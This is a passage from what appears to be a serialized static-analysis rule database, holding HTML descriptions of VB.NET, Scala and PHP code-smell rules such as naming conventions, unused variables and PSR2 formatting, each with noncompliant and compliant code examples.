<p>This rule will not generate issues for <code>Catch</code> blocks with just <code>Throw</code> inside if they are followed by a <code>Catch</code>
block for a more general exception type that does more than just rethrowing the exception.</p>
<pre>
Dim s As String = ""
Try
    s = File.ReadAllText(fileName)
Catch e As IOException 'Compliant, if removed will change the logic
    Throw
Catch e As Exception 'Compliant, does more than just rethrow
    logger.LogError(e)
    Throw
End Try
</pre>Z
CODE_SMELL
¢
vbnet:S1481í
vbnetS1481(Unused local variables should be removed"MINOR*vbnet:Ω<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function NumberOfMinutes(ByVal hours As Integer) As Integer
    Dim seconds As Integer = 0 ' Seconds never used
    Return hours * 60
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function NumberOfMinutes(ByVal hours As Integer) As Integer
    Return hours * 60
End Function
</pre>
<h2>Exceptions</h2>
<p>Unused locally created resources in a <code>Using</code> statement are not reported.</p>
<pre>
Using t = New TestTimer()
End Using
</pre>Z
CODE_SMELL
Ü
vbnet:S2429ˆ
vbnetS24298Arrays should be initialized using the "... = {}" syntax"MINOR*vbnet:ë<p>The <code>... = {}</code> syntax is more compact, more readable and less error-prone.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
  Sub Main()
    Dim foo(1) As String   ' Noncompliant
    foo(0) = "foo"
    foo(1) = "bar"
  End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Sub Main()
    Dim foo = {"foo", "bar"}  ' Compliant
  End Sub
End Module
</pre>Z
CODE_SMELL
«
vbnet:S4201∑
vbnetS4201/Null checks should not be used with "TypeOf Is""MINOR*vbnet:€<p>There's no need to null test in conjunction with an <code>TypeOf ... Is</code> test. <code>Nothing</code> is not an instance of anything, so a null
check is redundant.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If (x IsNot Nothing And TypeOf x Is MyClass)
    ' ...
End If

If (x Is Nothing Or TypeOf x IsNot MyClass)
    ' ...
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If (TypeOf x Is MyClass)
    ' ...
End If

If (TypeOf x IsNot MyClass)
    ' ...
End If
</pre>Z
CODE_SMELL
Ô
vbnet:S2304ﬂ
vbnetS23046Namespace names should comply with a naming convention"MINOR*vbnet:¸<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all namespace names match a provided regular
expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. Microsoft, System </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. System.IO </li>
  <li> Longer abbreviations need to be lower cased </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression: <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?(\.([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2}))*$</code></p>
<pre>
Namespace foo  ' Noncompliant
End Namespace
</pre>
<h2>Compliant Solution</h2>
<pre>
Namespace Foo  ' Compliant
End Namespace
</pre>Z
CODE_SMELL
¸
vbnet:S2951Ï
vbnetS2951?VB.Net: "Exit Select" statements should not be used redundantly"MINOR*vbnet:Ä<p>Visual Basic .NET, unlike many other programming languages, has no "fall-through" for its <code>Select</code> cases. Each case already has an
implicit <code>Exit Select</code> as its last instruction. It therefore is redundant to explicitly add one.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
  Sub Main()
    Dim x = 0
    Select Case x
      Case 0
        Console.WriteLine("0")
        Exit Select                ' Noncompliant
      Case Else
        Console.WriteLine("Not 0")
        Exit Select                ' Noncompliant
    End Select
  End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Sub Main()
    Dim x = 0
    Select Case x
      Case 0                         ' Compliant
        Console.WriteLine("0")
      Case Else                      ' Compliant
        Console.WriteLine("Not 0")
    End Select
  End Sub
End Module
</pre>Z
CODE_SMELL
¢
vbnet:S1226í
vbnetS1226@Method parameters and caught exceptions should not be reassigned"MINOR*vbnet:¨<p>While it is technically correct to assign to parameters from within method bodies, doing so before the parameter value is read is likely a bug.
Instead, initial values of parameters should be, if not treated as <code>readonly</code> then at least read before reassignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Foo(ByVal a As Integer)
        a = 42                  ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Foo(ByVal a As Integer)
        Dim tmp = a
        tmp = 42
    End Sub
End Module
</pre>
<h2>Exceptions</h2>
<p><code>ByRef</code> parameters are ignored.</p>
<pre>
Module Module1
    Sub Foo(ByRef a As Integer)
        a = 42                  ' Ignored; it is a ByRef parameter
    End Sub
End Module
</pre>ZBUG
Ü
vbnet:S2366ˆ
vbnetS23661Properties should comply with a naming convention"MINOR*vbnet:ò<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that property names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Module Module1
    Public Property foo As Integer   ' Noncompliant
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Public Property Foo As Integer   ' Compliant
End Module
</pre>Z
CODE_SMELL
€
vbnet:S2369À
vbnetS23699Non-private fields should comply with a naming convention"MINOR*vbnet:Â<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all non-private fields names match a provided regular
expression. </p>
<p>Note that this rule does not apply to non-private <code>Shared ReadOnly</code> fields, for which there is another rule.</p>
<p>The default configuration is:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Class Foo
    Public foo As Integer  ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Foo
    Public Foo As Integer  ' Compliant
End Class
</pre>Z
CODE_SMELL
˛
vbnet:S2364Ó
vbnetS23647"Private" fields should comply with a naming convention"MINOR*vbnet:ä<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all <code>Private</code> field names match the provided
regular expression.</p>
<p>Note that this rule does not apply to <code>Private Shared ReadOnly</code> fields, which are checked by another rule.</p>
<p>The default configuration is:</p>
<ul>
  <li> Optionally, can start with an underscore character or "s_", e.g. <em>foo, s</em>foo </li>
  <li> Camel casing, starting with a lower case character, e.g. backColor </li>
  <li> Short abbreviations of 2 letters can be capitalized only when not at the beginning, e.g. "id" in productID </li>
  <li> Longer abbreviations need to be lower cased, e.g. html </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^(s_|_)?[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Class Foo
    Private Foo As Integer  ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Foo
    Private foo As Integer  ' Compliant
End Class
</pre>Z
CODE_SMELL
£
vbnet:S2367ì
vbnetS2367<Non-private constants should comply with a naming convention"MINOR*vbnet:™<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all non-private <code>Const</code> field names comply with
the provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Module Module1
    Public Const foo = 0  ' Noncompliant
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Public Const Foo = 0  ' Compliant
End Module
</pre>Z
CODE_SMELL
ò
vbnet:S2362à
vbnetS23628Private constants should comply with a naming convention"MINOR*vbnet:£<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all <code>Private Const</code> field names comply with the
provided regular expression.</p>
<p>The default configuration is:</p>
<ul>
  <li> Optionally, can start with an underscore character or "s_", e.g. <em>foo, s</em>foo </li>
  <li> Camel casing, starting with a lower case character, e.g. backColor </li>
  <li> Short abbreviations of 2 letters can be capitalized only when not at the beginning, e.g. "id" in productID </li>
  <li> Longer abbreviations need to be lower cased, e.g. html </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^(s_|_)?[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Module Module1
    Private Const Foo = 0  ' Noncompliant
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Private Const foo = 0  ' Compliant
End Module
</pre>Z
CODE_SMELL
«
vbnet:S2363∑
vbnetS2363G"Private Shared ReadOnly" fields should comply with a naming convention"MINOR*vbnet:√<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all <code>Private Shared ReadOnly</code> field names comply
with the provided regular expression.</p>
<p>The default configuration is:</p>
<ul>
  <li> Optionally, can start with an underscore character or "s_", e.g. <em>foo, s</em>foo </li>
  <li> Camel casing, starting with a lower case character, e.g. backColor </li>
  <li> Short abbreviations of 2 letters can be capitalized only when not at the beginning, e.g. "id" in productID </li>
  <li> Longer abbreviations need to be lower cased, e.g. html </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^(s_|_)?[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Class Foo
    Private Shared ReadOnly Foo As Integer  ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Foo
    Private Shared ReadOnly foo As Integer  ' Compliant
End Class
</pre>Z
CODE_SMELL
∑
vbnet:S2375ß
vbnetS2375I"With" statements should be used for a series of calls to the same object"MINOR*vbnet:±<p>Using the <code>With</code> statement for a series of calls to the same object makes the code more readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default value of 6:</p>
<pre>
Module Module1
    Dim product = New With {.Name = "paperclips", .RetailPrice = 1.2, .WholesalePrice = 0.6, .A = 0, .B = 0, .C = 0}

    Sub Main()
        product.Name = ""           ' Noncompliant
        product.RetailPrice = 0
        product.WholesalePrice = 0
        product.A = 0
        product.B = 0
        product.C = 0
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Dim product = New With {.Name = "paperclips", .RetailPrice = 1.2, .WholesalePrice = 0.6, .A = 0, .B = 0, .C = 0}

    Sub Main()
        With product
            .Name = ""
            .RetailPrice = 0
            .WholesalePrice = 0
            .A = 0
            .B = 0
            .C = 0
        End With
    End Sub
End Module
</pre>Z
CODE_SMELL
…
vbnet:S3860π
vbnetS3860"ByVal" should not be used"MINOR*vbnet:Ú<p>Since Visual Studio 2010 SP1, the <code>ByVal</code> parameter modifier is implicitly applied, and therefore not required anymore. Removing it from
your source code will improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Sub Foo(ByVal bar As String)
  ' ...
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Sub Foo(bar As String)
  ' ...
End Sub
</pre>Z
CODE_SMELL
π
vbnet:S2373©
vbnetS2373CGeneric type parameter names should comply with a naming convention"MINOR*vbnet:π<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all generic type parameter names match a provided regular
expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Must start with an upper case 'T' character, e.g. T </li>
  <li> Followed by Pascal casing, starting with an upper case character, e.g. TKey </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. TFooID </li>
  <li> Longer abbreviations need to be lower cased, e.g. TFooHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default parameter value <code>^T(([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?)?$</code>:</p>
<pre>
Public Class Foo(Of t) ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class Foo(Of T) ' Compliant
End Class
</pre>Z
CODE_SMELL
ﬁ	

vbnet:S139œ	
vbnetS139:Comments should not be located at the end of lines of code"MINOR*vbnet:È<p>This rule verifies that single-line comments are not located at the ends of lines of code. The main idea behind this rule is that in order to be
really readable, trailing comments would have to be properly written and formatted (correct alignment, no interference with the visual structure of
the code, not too long to be visible) but most often, automatic code formatters would not handle this correctly: the code would end up less readable.
Comments are far better placed on the previous empty line of code, where they will always be visible and properly formatted.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default comment pattern <code>^'\s*\S+\s*$</code>, which ignores single word comments:</p>
<pre>
Module Module1
  Sub Main()
    Console.WriteLine("Hello, world!") ' Noncompliant - My first program!
    Console.WriteLine("Hello, world!") ' CompliantOneWord
  End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Sub Main()
    ' Compliant - My first program!
    Console.WriteLine("Hello, world!")
    Console.WriteLine("Hello, world!") ' CompliantOneWord
  End Sub
End Module
</pre>Z
CODE_SMELL
™
vbnet:S2370ö
vbnetS2370KNon-private "Shared ReadOnly" fields should comply with a naming convention"MINOR*vbnet:¢<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all non-private <code>Shared ReadOnly</code> fields names
match a provided regular expression.</p>
<p>The default configuration is:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower cased, e.g. GetHtml </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code>:</p>
<pre>
Class Foo
    Public Shared ReadOnly foo As Integer  ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Foo
    Public Shared ReadOnly Foo As Integer  ' Compliant
End Class
</pre>Z
CODE_SMELL
¡
scala:S4663±
scalaS4663'Multi-line comments should not be empty"MINOR*scala:›<p>An empty multi-line comment is likely to be a mistake and doesn't help to improve the readability of the code. For these reasons, it should be
removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/* */

/*

 */
</pre>Z
CODE_SMELL
ú

scala:S105ç
scalaS105(Tabulation characters should not be used"MINOR*scala:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
≠
scala:S1940ù
scalaS1940%Boolean checks should not be inverted"MINOR*scala:À<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (!(a == 2)) { ...}  // Noncompliant
val b = !(i &lt; 10)  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a != 2) { ...}
val b = (i &gt;= 10)
</pre>Z
CODE_SMELL
ˆ
scala:S1125Ê
scalaS1125(Boolean literals should not be redundant"MINOR*scala:ë<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (booleanMethod() || false) { /* ... */ }
doSomething(!false)

booleanVariable = if (booleanMethod()) true else false
booleanVariable = if (booleanMethod()) true else exp
booleanVariable = if (booleanMethod()) false else exp
booleanVariable = if (booleanMethod()) exp else true
booleanVariable = if (booleanMethod()) exp else false
</pre>
<h2>Compliant Solution</h2>
<pre>
if (booleanMethod()) { /* ... */ }
doSomething(true)

booleanVariable = booleanMethod()
booleanVariable = booleanMethod() || exp
booleanVariable = !booleanMethod() &amp;&amp; exp
booleanVariable = !booleanMethod() || exp
booleanVariable = booleanMethod() &amp;&amp; exp
</pre>Z
CODE_SMELL
Ú

scala:S100„
scalaS1003Method names should comply with a naming convention"MINOR*scala:Ñ<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all function names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression:</p>
<pre>
def DoSomething( ) : Unit = { // Noncompliant
   // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
def doSomething( ) : Unit = {
   // ...
}
</pre>Z
CODE_SMELL
›

scala:S101Œ
scalaS1012Class names should comply with a naming convention"MINOR*scala:<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
</pre>Z
CODE_SMELL
®
scala:S1481ò
scalaS1481(Unused local variables should be removed"MINOR*scala:√<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>Z
CODE_SMELL
–

scala:S117¡
scalaS117RLocal variable and function parameter names should comply with a naming convention"MINOR*scala:√<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>Z
CODE_SMELL
Í
	php:S1131‹
phpS1131.Lines should not end with trailing whitespaces"MINOR*php:Ö<p>Trailing whitespaces are simply useless and should not stay in code. They may generate noise when comparing different versions of the same
file.</p>
<p>If you encounter issues from this rule, this probably means that you are not using an automated code formatter - which you should if you have the
opportunity to do so. </p>
<h2>Exceptions</h2>
<p>Lines containing only whitespaces.</p>Z
CODE_SMELL
Ï
	php:S1779ﬁ
phpS17799Only LF character (Unix-like) should be used to end lines"MINOR*php:¸<p>All developers should use the same end-line character(s) to prevent polluting the history changelog of source files in the SCM engine. Moreover
some SCM engines like Git might sometimes badly support use of Windows 'CRLF' end of line characters.</p>Z
CODE_SMELL
œB
	php:S1808¡B
phpS18083Source code should comply with formatting standards"MINOR*php:ÂA<p>Shared coding conventions make it possible for a team to collaborate efficiently. This rule raises issues for failures to comply with formatting
standard. The default parameter values conform to the PSR2 standard.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default PSR2 parameter values:</p>
<pre>
use FooClass;‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ  // Noncompliant; the "use" declaration should be placed after the "namespace" declaration

namespace Vendor\Package;
use FooClass;‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ  // Noncompliant; the "namespace" declaration should be followed by a blank line
$foo = 1;‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ  // Noncompliant; the "use" declaration should be followed by a blank line

class ClassA {‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ ‚ÄÇ ‚ÄÇ// Noncompliant; an open curly brace should be at the beginning of a new line for classes and functions
‚ÄÇ‚ÄÇfunction my_function(){ ‚ÄÇ// Noncompliant; curly brace on wrong line
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇif ($firstThing)‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ// Noncompliant; an open curly brace should be at the end of line for a control structure
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ{
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ...
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ}

‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇif ($secondThing)‚ÄÇ   {‚ÄÇ// Noncompliant; there should be exactly one space between the closing parenthesis and the opening curly brace
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ...
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ}

    if($thirdThing) {      // Noncompliant; there should be exactly one space between the control structure keyword and the opening parenthesis
      ...
    }
    else {                 // Noncompliant; the close curly brace and the next "else" (or "catch" or "finally") keyword should be located on the same line
      ...
    }

    try{                   // Noncompliant; there should be exactly one space between the control structure keyword and the curly brace
      ...
    } catch (Exception $e) {
‚ÄÇ‚ÄÇ  }

    analyse( $fruit ) ;    // Noncompliant; there should not be any space after the opening parenthesis and before the closing parenthesis

    for ($i = 0;$i &lt; 10;   $i++) { // Nomcompliant; there should be exactly one space after each ";" in the {{for}} statement
      ...
    }

    pressJuice($apply ,$orange);    // Noncompliant; the comma should be followed by one space and not preceded by any

    do_something ();       // Noncompliant; there should not be any space after the method name

    foreach ($fruits    as $fruit_key =&gt;     $fruit) {  // Noncompliant; in the foreach statement there should be one space before and after "as" keyword and "=&gt;" operator
      ...
    }
  }
}

class ClassB
extends ParentClass  // Noncompliant; the class name and the "extends" / "implements" keyword should be on the same line
{
  ...
}

class ClassC extends ParentClass implements \ArrayAccess, \Countable,
    \Serializable    // Noncompliant; the list of implemented interfaces should be correctly indented
{

  public function aVeryLongMethodName(ClassTypeHint $arg1, // Noncompliant; the arguments in a method declaration should be correctly indented
    &amp;$arg2, array $arg3 = []) {

    $noArgs_longVars = function () use ($longVar1,         // Noncompliant; the arguments in a function declaration should be correctly indented
        $longerVar2,
        $muchLongerVar3
    ) {
      ...
    };

    $foo-&gt;bar($longArgument,    // Noncompliant; the arguments in a method call should be correctly indented
      $longerArgument,
      $muchLongerArgument);     // Noncompliant; the closing parenthesis should be placed on the next line

    $closureWithArgsAndVars = function($arg1, $arg2)use   ($var1, $var2) {  // Noncompliant; the closure declaration should be correctly spaced - see (5)
      ...
    };
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
namespace Vendor\Package; // Compliant; the "namespace" declaration is followed by a blank line

use FooClass;             // Compliant; the "use" declaration is placed after the "namespace" declaration
                          // Compliant; the "use" declaration is followed by a blank line
$foo = 1;

class ClassA
{‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ           ‚ÄÇ// Compliant; the open curly brace is at the beginning of a new line for the class
‚ÄÇ‚ÄÇfunction my_function()
  {‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ                   // Compliant; the open curly brace is at the beginning of a new line for the function
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇif ($firstThing)‚ÄÇ{‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ// Compliant; the open curly brace is at the end of line for the control structure
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ...
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ}

‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇif ($secondThing)‚ÄÇ{‚ÄÇ‚ÄÇ // Compliant; there is exactly one space between the closing parenthesis and the opening curly brace
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ...
‚ÄÇ‚ÄÇ‚ÄÇ‚ÄÇ}

    if ($thirdThing) {    // Compliant; there is exactly one space between the control structure keyword and the opening parenthesis
      ...
    } else {              // Compliant; the close curly brace and the next "else" (or "catch" or "finally") keyword are located on the same line
      ...
    }

    try {                 // Compliant; there is exactly one space between the control structure keyword and the curly brace
      ...
    } catch (Exception $e) {
      ...
    }

    analyse($fruit);      // Compliant: there is no space after the opening parenthesis, nor before the closing parenthesis

    for ($i = 0; $i &lt; 10; $i++) { // Compliant: there is exactly one space after each ";" in the {{for}} statement
      ...
    }

    pressJuice($apply, $orange);   // Compliant; the comma is followed by one space and is not preceded by any

    do_something();       // Compliant; there is no space after the method name

    foreach ($fruits as $fruit_key =&gt; $fruit) {  // Compliant; in the foreach statement there is one space before and after "as" keyword and "=&gt;" operator
      ...
    }
  }
}

/* The idea here is to make it obvious at first glance that a class extends
 * some other classes and/or implements some interfaces. The names of
 * extended classes or implemented interfaces can be located on subsequent lines.
 */
class ClassB1 extends ParentClass // Compliant; the class name and the "extends" (or "implements") keyword are located on the same line
{
  ...
}

class ClassB2 extends             // Compliant; the class name and the "extends" (or "implements") keyword are located on the same line
ParentClass {
  ...
}

/* Lists of implements may be split across multiple lines, where each subsequent line
 * is indented once. When doing so, the first item in the list should be on the next line,
 * and there should be only one interface per line.
 */
class ClassC extends ParentClass implements
    \ArrayAccess,         // Compliant; the list of implemented interfaces is correctly indented
    \Countable,
    \Serializable
{
  /* Argument lists may be split across multiple lines, where each subsequent line
   * is indented once. When doing so, the first item in the list should be on the next line,
   * and there should be only one argument per line. Also, when the argument list is
   * split across multiple lines, the closing parenthesis and opening brace should be
   * placed together on their own line with one space between them.
   */
  public function aVeryLongMethodName(
    ClassTypeHint $arg1,  // Compliant; the arguments in a method/function declaration are correctly indented
      &amp;$arg2,
      array $arg3 = []
    ) {
      $noArgs_longVars = function () use (
        $longVar1,        // Compliant; the arguments in a method/function declaration are correctly indented
        $longerVar2,
        $muchLongerVar3
      ) {
        ...
      };


    /* Argument lists may be split across multiple lines, where each subsequent line is
     * indented once. When doing so, the first item in the list should be on the next line,
     * and there should be only one argument per line.
     */
    $foo-&gt;bar(
      $longArgument,       // Compliant; the arguments in the method call are be correctly indented
      $longerArgument,
      $muchLongerArgument
    );                     // Compliant; the closing parenthesis is placed on a separate line

    /* Closures should be declared with a space after the "function" keyword,
     * and a space before and after the "use" keyword.
     */
    $closureWithArgsAndVars = function ($arg1, $arg2) use ($var1, $var2) { // Compliant; the closure declaration is correctly spaced
      ...
    };
  }
}
</pre>Z
CODE_SMELL
ñ
php:S105â
phpS105(Tabulation characters should not be used"MINOR*php:π<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>Z
CODE_SMELL
Ô
	php:S1301·
phpS13019"switch" statements should have at least 3 "case" clauses"MINOR*php:ˇ<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($variable) {
  case 0:
    do_something();
    break;
  default:
    do_something_else();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($variable == 0) {
  do_something();
} else {
  do_something_else();
}
</pre>Z
CODE_SMELL
”
	php:S1784≈
phpS1784/Method visibility should be explicitly declared"MINOR*php:Ù<p>Class methods may be defined as public, private, or protected. Methods declared without any explicit visibility keyword are defined as public. To
prevent any misunderstanding, this visibility should always be explicitly declared.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
public function foo(){...}
</pre>ZBUG
⁄
	php:S1264Ã
phpS12645A "while" loop should be used instead of a "for" loop"MINOR*php:Ó<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>Z
CODE_SMELL
¥
	php:S1781¶
phpS1781GPHP keywords and constants "true", "false", "null" should be lower case"MINOR*php:∂<p>Using indifferently lower or upper case for PHP keywords and constants "true", "false" and "null" can impact the readability of PHP source
code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?php ECHO 'Hello World'; ?&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;?php echo 'Hello World'; ?&gt;
</pre>Z
CODE_SMELL
√
	php:S1780µ
phpS1780?Closing tag "?>" should be omitted on files containing only PHP"MINOR*php:Õ<p>According to the PSR2 coding standard:</p>
<blockquote>
  <p>The closing <code>?&gt;</code> tag should be omitted from files containing only PHP.</p>
</blockquote>
<p>According to the PHP manual:</p>
<blockquote>
  <p>in some cases omitting it is helpful when using include or require, so unwanted whitespace will not occur at the end of files, and you will still
  be able to add headers to the response later. It is also handy if you use output buffering, and would not like to see added unwanted whitespace at
  the end of the parts generated by the included files.</p>
</blockquote>Z
CODE_SMELL
Ä
php:S113Û
phpS1130Files should contain an empty newline at the end"MINOR*php:õ<p>Some tools work better when files end with an empty line.</p>
<p>This rule simply generates an issue if it is missing.</p>
<p>For example, a Git diff looks like this if the empty line is missing at the end of the file:</p>
<pre>
+class Test {
+}
\ No newline at end of file
</pre>Z
CODE_SMELL
°
php:S114î
phpS1146Interface names should comply with a naming convention"MINOR*php:∂<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all
interface names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
interface myInterface {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
interface MyInterface {...}
</pre>Z
CODE_SMELL
ä
php:S116˝
phpS1162Field names should comply with a naming convention"MINOR*php:£<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that field
names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
